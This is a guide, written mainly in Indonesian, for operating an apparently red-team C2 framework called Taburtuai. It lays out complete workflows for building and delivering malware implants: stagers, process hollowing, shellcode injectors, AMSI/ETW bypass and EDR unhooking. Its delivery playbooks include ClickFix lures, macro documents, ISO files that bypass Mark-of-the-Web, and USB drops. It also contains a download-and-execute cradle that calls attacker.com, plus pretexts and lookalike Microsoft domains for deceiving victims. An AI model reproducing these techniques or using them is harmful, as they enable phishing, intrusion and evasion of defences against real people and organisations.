# Taburtuai C2 — Implant Guide
## Staged & Stageless Initial Access

---

## Daftar Isi

1. [Konsep Dasar](#1-konsep-dasar)
2. [Workflow Staged](#2-workflow-staged)
3. [Workflow Stageless](#3-workflow-stageless)
4. [Format Output](#4-format-output)
5. [Delivery Templates](#5-delivery-templates)
6. [OPSEC & Evasion Notes](#6-opsec--evasion-notes)
7. [Referensi Cepat](#7-referensi-cepat)

---

## 1. Konsep Dasar

### Staged vs Stageless

```
STAGED
──────
Target ──→ Stager (kecil, ~2MB)
              │ download /stage/TOKEN
              ▼
          C2 Server ──→ Full Agent (terenkripsi AES-256-GCM)
              │ decrypt + execute in-memory
              ▼
          Agent aktif → beacon ke C2

STAGELESS
─────────
Target ──→ Full Agent (langsung, self-contained)
              │ semua config baked-in
              ▼
          Agent aktif → beacon ke C2
```

| Aspek | Staged | Stageless |
|-------|--------|-----------|
| Ukuran payload awal | Kecil (~2MB) | Besar (~8-15MB) |
| Evasion AV/EDR | Lebih baik (payload tidak ada di disk awal) | Bergantung pada obfuscation |
| Delivery channel | PS1, HTA, VBA, ClickFix, macro | EXE langsung, USB, ISO, DLL |
| Kebutuhan koneksi ke C2 | Saat eksekusi stager | Tidak (payload sudah ada) |
| Use case | Phishing, ClickFix, social engineering | Target dengan keamanan minimal, USB drop |

---

## 2. Workflow Staged

### Langkah 1 — Build Full Agent

```bash
# Basic (with console, untuk testing)
make agent-windows C2_SERVER=https://c2.example.com ENC_KEY=MyKey1234567890

# Stealth (no console, stripped, evasion enabled)
make agent-win-stealth \
  C2_SERVER=https://c2.example.com \
  ENC_KEY=MyKey1234567890X \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31

# Dengan garble obfuscation (butuh: go install mvdan.cc/garble@latest)
make agent-win-garble \
  C2_SERVER=https://c2.example.com \
  ENC_KEY=MyKey1234567890X
```

Output: `bin/agent_windows.exe` (atau `_stealth`, `_obf`)

---

### Langkah 2 — Upload Payload ke C2 Stage

#### Via Operator CLI
```bash
# Start operator
./bin/operator console --server https://c2.example.com

# Dalam console:
stage upload bin/agent_windows_stealth.exe \
  --format exe \
  --ttl 48 \
  --desc "Q4 phish - finance dept"

# Output:
# [+] Stage uploaded (8204288 bytes)
# [*] Token    : a3f8d2c1e9b047f6a2d3c4e5f6a7b8c9
# [*] Stage URL: https://c2.example.com/stage/a3f8d2c1e9b047f6a2d3c4e5f6a7b8c9
```

#### Via Generator CLI (langsung upload)
```bash
./bin/generate upload bin/agent_windows_stealth.exe \
  --server https://c2.example.com \
  --api-key YOUR_API_KEY \
  --format exe \
  --ttl 48 \
  --desc "Q4 phish"
```

#### Via API Langsung (curl)
```bash
PAYLOAD_B64=$(base64 -w 0 bin/agent_windows_stealth.exe)

curl -X POST https://c2.example.com/api/v1/stage \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d "{
    \"payload_b64\": \"$PAYLOAD_B64\",
    \"format\": \"exe\",
    \"arch\": \"amd64\",
    \"os\": \"windows\",
    \"ttl_hours\": 48,
    \"description\": \"Q4 phish campaign\"
  }"
```

---

### Langkah 3 — Build Stager

```bash
# EXE stager (paling basic, untuk embedding di template lain)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --method hollow \
  --format exe \
  --output bin/stager.exe

# PS1 stager (drop-and-execute, cocok untuk ClickFix)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --method hollow \
  --format ps1 \
  --output delivery/stager.ps1

# PS1 in-memory shellcode runner (no disk touch, payload harus raw shellcode)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --method thread \
  --format ps1-mem \
  --output delivery/stager_mem.ps1

# HTA (spear phishing via email/link)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --method hollow \
  --format hta \
  --output delivery/phish.hta

# VBA macro (Office document)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --format vba \
  --output delivery/macro.bas

# C# (via MSBuild/InstallUtil LOLBin)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --format cs \
  --output delivery/runner.cs

# DLL sideloading
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --method thread \
  --format dll \
  --output delivery/version.dll

# Raw shellcode (PIC, untuk injector eksternal/BOF/Nim dropper)
./bin/generate stager \
  --c2 https://c2.example.com \
  --token a3f8d2c1e9b047f6 \
  --key MyKey1234567890X \
  --format shellcode \
  --output delivery/stager.bin
```

#### Flag stager lengkap

| Flag | Default | Keterangan |
|------|---------|------------|
| `--c2` | `http://127.0.0.1:8080` | C2 base URL |
| `--token` | *required* | Stage token dari langkah 2 |
| `--key` | `SpookyOrcaC2AES1` | AES key (harus sama dengan server) |
| `--method` | `thread` | `thread` / `hollow` / `drop` |
| `--hollow-exe` | `svchost.exe` | Target process untuk hollow |
| `--format` | `exe` | `exe` / `ps1` / `ps1-mem` / `hta` / `vba` / `cs` / `dll` / `shellcode` |
| `--arch` | `amd64` | `amd64` / `x86` |
| `--jitter` | `0` | Anti-sandbox sleep (detik) sebelum eksekusi |
| `--no-strip` | `false` | Keep debug symbols |
| `--output` | auto | Path output file |

---

### Langkah 4 — Generate Delivery Template

#### ClickFix (paling efektif untuk social engineering)
```bash
# Generate halaman HTML lure dengan Win+R command embedded
./bin/generate template \
  --type clickfix \
  --stager-file bin/stager.exe \
  --lure "Browser Security Update Required" \
  --output delivery/lure.html
```

Cara pakai:
1. Host `lure.html` di web server (atau gunakan phishing kit)
2. Kirim link ke target via email/SMS/WhatsApp
3. Target membuka halaman → melihat instruksi "tekan Win+R, paste command"
4. Target paste → stager download agent → agent aktif

#### HTA via Spear Phishing
```bash
./bin/generate template \
  --type hta \
  --url https://c2.example.com/stage/TOKEN \
  --output delivery/invoice.hta
```

Cara pakai:
- Kirim `invoice.hta` sebagai email attachment
- Target double-click → mshta.exe menjalankan → stager aktif

#### VBA Macro (Office Document)
```bash
./bin/generate template \
  --type macro \
  --url https://c2.example.com/stage/TOKEN \
  --output delivery/macro.bas
```

Cara pakai:
1. Buka Excel/Word kosong
2. Alt+F11 → Insert Module → Paste isi `macro.bas`
3. Simpan sebagai `.xlsm` / `.docm`
4. Target buka → Enable Content → macro berjalan

#### LNK (Windows Shortcut)
```bash
./bin/generate template \
  --type lnk \
  --url https://c2.example.com/stage/TOKEN \
  --lure "Q4 Report" \
  --output delivery/create_lnk.ps1
```

Cara pakai:
1. Jalankan `create_lnk.ps1` di attack host (Windows) → membuat `Q4 Report.lnk`
2. Kirim via ISO/ZIP/email
3. Target double-click LNK → cmd → PS1 cradle → stager download

#### ISO Dropper
```bash
./bin/generate template \
  --type iso \
  --url https://c2.example.com/stage/TOKEN \
  --stager-file bin/stager.exe \
  --lure "Q4 Financial Report" \
  --output delivery/iso_recipe.txt
```

ISO berisi: `autorun.inf` + `stager.exe` + `.lnk` file

```bash
# Linux: buat ISO dari direktori
mkdir iso_contents
cp bin/stager.exe iso_contents/update.exe
cp delivery/Q4_Report.lnk iso_contents/
echo "[AutoRun]" > iso_contents/autorun.inf
echo "open=update.exe" >> iso_contents/autorun.inf
mkisofs -o payload.iso -J -R -l iso_contents/
```

---

### Langkah 5 — Manage Stages

```bash
# List semua stages
stage list

# Output:
# TOKEN                              FORMAT      ARCH    USED     DESCRIPTION
# ─────────────────────────────────────────────────────────────────────────────
# a3f8d2c1e9b047f6a2d3c4e5f6a7b8c9  exe         amd64   no       Q4 phish - finance dept

# Hapus stage (setelah campaign selesai)
stage delete a3f8d2c1e9b047f6a2d3c4e5f6a7b8c9
```

---

## 3. Workflow Stageless

### Build Stageless Implant

#### Via Makefile
```bash
# Windows EXE (console, untuk testing)
make agent-windows \
  C2_SERVER=https://c2.example.com \
  ENC_KEY=MyKey1234567890X

# Windows stealth (no window, stripped)
make agent-win-stealth \
  C2_SERVER=https://c2.example.com \
  ENC_KEY=MyKey1234567890X \
  INTERVAL=120 \
  JITTER=40 \
  KILL_DATE=2026-06-30

# Linux
make agent-linux C2_SERVER=https://c2.example.com

# macOS
make agent-darwin C2_SERVER=https://c2.example.com
```

#### Via Generator (lebih banyak opsi)
```bash
./bin/generate stageless \
  --c2 https://c2.example.com \
  --key MyKey1234567890X \
  --secondary-key TaburtuaiSecondary \
  --interval 120 \
  --jitter 40 \
  --kill-date 2026-06-30 \
  --exec-method powershell \
  --evasion \
  --sleep-mask \
  --no-gui \
  --arch amd64 \
  --output bin/implant.exe

# Dengan garble obfuscation
./bin/generate stageless \
  --c2 https://c2.example.com \
  --key MyKey1234567890X \
  --garble \
  --output bin/implant_obf.exe
```

#### Flag stageless lengkap

| Flag | Default | Keterangan |
|------|---------|------------|
| `--c2` | `http://127.0.0.1:8080` | C2 server URL |
| `--key` | `SpookyOrcaC2AES1` | AES encryption key (min 16 karakter) |
| `--secondary-key` | `TaburtuaiSecondary` | Secondary key |
| `--interval` | `30` | Beacon interval (detik) |
| `--jitter` | `20` | Jitter persen (0-100) |
| `--kill-date` | kosong | Format `YYYY-MM-DD`, agent mati setelah tanggal ini |
| `--exec-method` | `powershell` | `cmd` / `powershell` |
| `--evasion` | `true` | Enable AMSI/ETW bypass saat startup |
| `--sleep-mask` | `true` | XOR memory saat sleep |
| `--no-gui` | `true` | Sembunyikan console window |
| `--garble` | `false` | Obfuscate dengan garble |
| `--arch` | `amd64` | `amd64` / `x86` |
| `--output` | auto | Path output |

---

### Delivery Stageless

Karena stageless adalah full EXE, delivery options:

| Cara | Deskripsi |
|------|-----------|
| **Direct execution** | Target jalankan langsung, USB drop |
| **ISO wrapping** | Sembunyikan dalam ISO agar bypass Mark-of-the-Web (MOTW) |
| **ZIP password** | Kirim via email sebagai ZIP berpassword (bypass email scanner) |
| **DLL sideload** | Rename sebagai DLL yang sideloadable |
| **Rename sebagai legit** | `AdobeUpdate.exe`, `OneDriveSetup.exe`, dll |

```bash
# Contoh: wrap dalam ISO untuk bypass MOTW
mkdir iso_payload
cp bin/implant.exe iso_payload/Document.exe
mkisofs -o document.iso -J iso_payload/
# MOTW tidak diterapkan ke file dalam ISO yang di-mount
```

---

## 4. Format Output

### `exe` — Windows Executable
```bash
./bin/generate stager --format exe --output stager.exe
```
- Gunakan untuk: USB drop, ISO, embedding di template lain
- Ukuran: ~2-4 MB (stager), ~8-15 MB (stageless)
- Delivery: langsung eksekusi atau via LNK/macro

---

### `ps1` — PowerShell Drop-and-Execute
```bash
./bin/generate stager --format ps1 --output stager.ps1
```
- Embed stager EXE sebagai base64 dalam PS1
- Drop ke `%TEMP%\random.exe` dan eksekusi
- Cocok untuk: ClickFix, download cradle, macro payload

**Cara pakai manual:**
```powershell
# Run langsung
powershell -ExecutionPolicy Bypass -File stager.ps1

# Encoded (bypass logging)
$cmd = Get-Content stager.ps1 -Raw
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $b64
```

---

### `ps1-mem` — PowerShell In-Memory Shellcode
```bash
./bin/generate stager --format ps1-mem --output stager_mem.ps1
```
- Download raw shellcode dari C2, jalankan via VirtualAlloc PInvoke
- **Payload harus raw shellcode** (bukan PE)
- Tidak touch disk (fully in-memory)

```powershell
# ClickFix cradle (paste di Run dialog)
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/s.ps1')"
```

---

### `hta` — HTML Application
```bash
./bin/generate stager --format hta --output phish.hta
```
- Dijalankan oleh `mshta.exe` (built-in Windows)
- Embed PS1 dalam VBScript `<script language="VBScript">`
- Cocok untuk: email attachment, web phishing, malvertising

**Eksekusi:**
```
mshta.exe phish.hta            # Double-click atau manual
mshta.exe https://attacker.com/phish.hta  # Direct URL
```

---

### `vba` — Office VBA Macro
```bash
./bin/generate stager --format vba --output macro.bas
```
- Gunakan XMLHTTP untuk download stager EXE
- ADODB.Stream untuk write ke disk
- WScript.Shell untuk eksekusi
- Cocok untuk: Excel/Word macro, spear phishing dokumen

**Cara pakai:**
1. `Alt+F11` → `Insert > Module`
2. Paste isi `.bas`
3. Simpan sebagai `.xlsm` / `.docm`
4. Target: Enable Macros → auto-execute via `Auto_Open` / `Workbook_Open`

---

### `cs` — C# Source (LOLBin Execution)
```bash
./bin/generate stager --format cs --output runner.cs
```
- C# shellcode runner via PInvoke (VirtualAlloc + CreateThread)
- Payload harus raw shellcode

**Eksekusi via LOLBin:**
```xml
<!-- runner.csproj untuk MSBuild -->
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Exec Command="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
      /out:runner.exe runner.cs" />
    <Exec Command="runner.exe" />
  </Target>
</Project>
```

```bash
# Via MSBuild (LOLBin, tidak butuh compiler eksplisit)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe runner.csproj

# Via InstallUtil
# (Butuh modifikasi class sebagai installer — lihat USAGE.md)
```

---

### `shellcode` — Raw Position-Independent Code (PIC)
```bash
./bin/generate stager --format shellcode --output stager.bin
```
- Output: raw shellcode bytes (PIC/PIS)
- Gunakan untuk: inject ke tools lain, custom dropper, Nim loader, BOF, C injector

**Cara pakai:**
```python
# Python injector (untuk testing)
import ctypes, sys
sc = open('stager.bin','rb').read()
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, sc, len(sc))
h = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(h, -1)
```

---

### `dll` — Sideloadable DLL
```bash
./bin/generate stager --format dll --method thread --output version.dll
```
- Buat DLL yang memiliki exports sesuai nama DLL target (proxy)
- Cocok untuk: DLL hijacking, DLL sideloading
- Common targets: `version.dll`, `dbghelp.dll`, `wbemcomn.dll`

**Sideload scenario:**
```
Legit app folder/
├── LegitApp.exe         (app asli, loads version.dll dari folder lokal)
└── version.dll          (← file kita, dieksekusi saat app start)
```

---

## 5. Delivery Templates

### ClickFix (Social Engineering)

ClickFix memanfaatkan fake verification/CAPTCHA page yang menipu user untuk:
1. Membuka Run dialog (Win+R)
2. Paste command PS1 yang sudah di-embed di halaman
3. Tekan Enter → stager berjalan

```bash
./bin/generate template \
  --type clickfix \
  --stager-file bin/stager.exe \
  --lure "Please verify you are human to continue" \
  --output lure.html
```

**Lure ideas:**
- `"Browser Security Update Required"`
- `"CAPTCHA Verification"`
- `"Human Verification Failed — Click to Retry"`
- `"Windows Defender has detected suspicious activity"`
- `"Microsoft 365 Security Alert"`

**Kombinasi ClickFix:**
```
Web Phishing      → Link ke lure.html → User paste command → stager
Email Phishing    → "Click to view document" → redirect ke lure.html
SMS Phishing      → "Verify your account" → lure.html
QR Code           → Target scan QR → lure.html di mobile
```

---

### Macro (Office Document)

```bash
./bin/generate template \
  --type macro \
  --url https://c2.example.com/stage/TOKEN \
  --output macro.bas
```

**Lure document ideas:**
- `Q4_Financial_Report_2025.xlsm`
- `Invoice_12345_Pending.docm`
- `HR_Policy_Update_2026.xlsm`
- `Contract_Amendment_Signed.docm`

**Pretext yang efektif:**
- Finance/accounting: invoice, laporan keuangan
- HR: kebijakan baru, form lembur
- IT: password expiry notice
- Legal: NDA, kontrak

---

### HTA (Spear Phishing)

```bash
./bin/generate template \
  --type hta \
  --url https://c2.example.com/stage/TOKEN \
  --output invoice.hta
```

```
Delivery:
  Email → attachment .hta → target double-click → mshta.exe → stager
  Web   → "Download invoice" → invoice.hta → target open → stager
  
Catatan: HTA bypass Script Block Logging karena tidak menggunakan PowerShell
```

---

### LNK (Shortcut)

```bash
./bin/generate template \
  --type lnk \
  --url https://c2.example.com/stage/TOKEN \
  --lure "Q4 Report" \
  --output create_lnk.ps1

# Jalankan di attack host untuk buat .lnk
powershell -File create_lnk.ps1
```

**Cara delivery LNK:**
- Kirim dalam ZIP (rename extension agar tidak suspicious)
- Taruh dalam ISO (bypass MOTW)
- USB drop dengan autorun.inf (legacy systems)

---

## 6. OPSEC & Evasion Notes

### Stager OPSEC

```bash
# Anti-sandbox: tidur dulu sebelum eksekusi
./bin/generate stager --jitter 30 --method hollow ...
# → stager sleep 30-60 detik sebelum download
# → sandbox timeout biasanya 30-60 detik → tidak terdeteksi

# Process hollow ke process yang wajar untuk network
./bin/generate stager --method hollow --hollow-exe "C:\Windows\System32\svchost.exe" ...

# Gunakan HTTPS dan domain yang terlihat legit
./bin/generate stager --c2 https://update.microsoft-cdn.com ...
```

### Agent OPSEC

```bash
# Kill date: agent mati setelah engagement selesai
make agent-win-stealth KILL_DATE=2026-03-31

# Working hours: hanya aktif saat jam kerja target
./bin/generate stageless --interval 300 --jitter 40 ...
# Kemudian set timegate via operator:
# opsec timegate <agent-id> --start 8 --end 18

# Sleep masking: XOR memory saat tidur
make agent-win-stealth  # defaultnya sudah enable sleep masking
```

### Stage Server OPSEC

```bash
# TTL pendek: stage expired setelah 24 jam
stage upload payload.exe --ttl 24

# One-shot: stage otomatis burned setelah pertama diakses
# (default behavior — tidak bisa di-replay)

# Pisahkan C2 server dari stage server (opsional)
# Stage di CDN/redirector, C2 di backend
```

### Komunikasi

```
# Gunakan domain yang terlihat legit:
update.windows-cdn[.]com
cdn.office365-update[.]net
telemetry.microsoft-update[.]org

# Domain fronting (jika C2 di balik CDN):
# Host header → target CDN domain
# SNI → fronted domain

# Profile beacon yang realistis:
INTERVAL=300  # 5 menit (mirip browser polling)
JITTER=40     # ±40% variasi
```

---

## 7. Referensi Cepat

### Scenario: Phishing ClickFix + Staged

```bash
# Build + upload agent
make agent-win-stealth C2_SERVER=https://c2.example.com ENC_KEY=K3y16CharExact!!
./bin/generate upload bin/agent_windows_stealth.exe \
  --server https://c2.example.com --api-key APIKEY \
  --ttl 48 --desc "clickfix-finance"
# → TOKEN=abc123...

# Generate stager
./bin/generate stager \
  --c2 https://c2.example.com \
  --token abc123 \
  --key K3y16CharExact!! \
  --method hollow \
  --jitter 15 \
  --format exe \
  --output bin/stager.exe

# Generate ClickFix lure
./bin/generate template \
  --type clickfix \
  --stager-file bin/stager.exe \
  --lure "Microsoft 365 Security Verification" \
  --output delivery/lure.html

# Host lure.html di web server → kirim link ke target
```

### Scenario: Spear Phishing Macro + Staged

```bash
# Build agent + upload (sama seperti di atas, dapatkan TOKEN)

# Generate VBA macro
./bin/generate template \
  --type macro \
  --url https://c2.example.com/stage/TOKEN \
  --output delivery/macro.bas

# Embed macro ke dokumen Excel:
# 1. Buka Excel → Alt+F11 → Insert Module → Paste macro.bas
# 2. File → Save As → Excel Macro-Enabled Workbook (.xlsm)
# 3. Rename: Q4_Salary_Review_2025.xlsm
# 4. Kirim via phishing email

# Target: Enable Content → agent aktif
```

### Scenario: USB Drop + Stageless

```bash
# Build stageless (no garble needed jika target minimal security)
make agent-win-stealth \
  C2_SERVER=https://c2.example.com \
  ENC_KEY=K3y16CharExact!! \
  INTERVAL=120 \
  KILL_DATE=2026-06-30

# Wrap dalam ISO (bypass MOTW)
mkdir iso_drop
cp bin/agent_windows_stealth.exe iso_drop/Windows_Security_Update.exe
mkisofs -o security_update.iso -J iso_drop/

# Copy ISO ke USB → tinggal di target area (parking lot, lobby)
# Target mount ISO → double-click EXE → agent aktif
```

### Scenario: DLL Sideloading + Stageless

```bash
# Build stageless sebagai DLL
./bin/generate stageless \
  --c2 https://c2.example.com \
  --key K3y16CharExact!! \
  --format dll \
  --output version.dll

# Taruh bersama legit app yang load version.dll dari folder lokal
# Contoh: Zoom, Teams, VS Code — banyak yang vulnerable ke DLL search order

# Target jalankan legit app → version.dll di-load → agent aktif
```

### Operator Commands setelah Agent Aktif

```bash
# Cek agent
agents list

# AMSI + ETW bypass (jika belum auto)
bypass amsi <agent-id> --wait
bypass etw <agent-id> --wait

# Unhook NTDLL (hapus EDR hooks)
evasion unhook <agent-id> --wait

# Lanjut ke post-exploitation...
```

---

*Built with taburtuaiC2 — flexible red team framework*
